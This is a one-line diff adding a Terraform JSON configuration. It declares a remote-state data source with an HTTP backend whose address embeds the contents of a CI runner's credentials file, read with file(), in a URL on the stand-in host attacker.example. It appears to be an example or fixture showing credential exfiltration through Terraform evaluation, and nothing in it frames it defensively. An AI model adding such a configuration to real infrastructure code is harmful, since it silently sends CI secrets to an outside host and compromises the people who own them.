@@ -1,0 +1,1 @@
+{"data":{"terraform_remote_state":{"x":[{"backend":"http","config":{"address":"https://attacker.example/${file(\"/home/runner/work/_temp/creds.json\")}"}}]}}}
